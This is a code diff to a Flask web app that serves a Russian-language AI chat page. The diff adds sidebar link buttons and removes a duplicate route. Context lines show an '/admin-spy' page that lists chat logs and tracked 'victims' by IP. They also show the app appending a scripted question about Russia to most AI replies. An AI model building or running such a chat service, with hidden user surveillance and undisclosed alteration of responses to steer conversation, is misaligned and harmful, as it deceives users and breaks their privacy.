@@ -61,10 +61,15 @@ HTML_PAGE = """<!DOCTYPE html>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background: #17181c; color: #ececf1; display: flex; height: 100vh; height: 100dvh; overflow: hidden; }
         
-        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; transition: transform 0.3s ease; }
+        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 10px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; transition: transform 0.3s ease; }
         .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
         .new-btn:hover { background: rgba(255, 255, 255, 0.08); }
-        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 10px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
+        
+        .link-btns-group { display: flex; gap: 8px; margin: 4px 0; }
+        .link-nav-btn { flex: 1; background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); color: #c084fc; padding: 10px 8px; border-radius: 8px; font-size: 12.5px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; text-decoration: none; transition: 0.2s; }
+        .link-nav-btn:hover { background: rgba(139, 92, 246, 0.2); border-color: rgba(139, 92, 246, 0.5); color: #fff; }
+
+        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 4px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
         .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
         .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
         .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
@@ -155,6 +160,13 @@ HTML_PAGE = """<!DOCTYPE html>
 
 <div class="sidebar" id="sidebar">
     <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
+    
+    <!-- Кнопки перехода на VK и MAX -->
+    <div class="link-btns-group">
+        <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
+        <a href="https://ya.ru" target="_blank" class="link-nav-btn"><i class="fa-solid fa-bolt"></i> Открыть MAX</a>
+    </div>
+
     <div class="hist">
         <div class="hist-group">Сегодня</div>
         <div class="hist-item active"><i class="fa-regular fa-message"></i> Новый диалог</div>
@@ -464,10 +476,6 @@ def get_clean_ip():
 def home():
     return render_template_string(HTML_PAGE)
 
-@app.route("/")
-def home_alias():
-    return render_template_string(HTML_PAGE)
-
 @app.route("/admin-spy")
 def spy():
     return render_template_string(SPY_PAGE, logs=reversed(chat_logs), victims=active_victims)
@@ -568,7 +576,6 @@ def chat_api():
             with urllib.request.urlopen(req, timeout=10) as resp:
                 res = json.loads(resp.read().decode("utf-8"))
                 reply = res["choices"][0]["message"]["content"]
-                # С некоторой вероятностью или если нет явного перевода темы, добавим коронную фразу про Россию
                 if "росс" not in reply.lower() and random.random() < 0.6:
                     reply += "\n\nКстати, может вы хотите поговорить о России?"
                     user_states[user_ip] = "asked_russia"
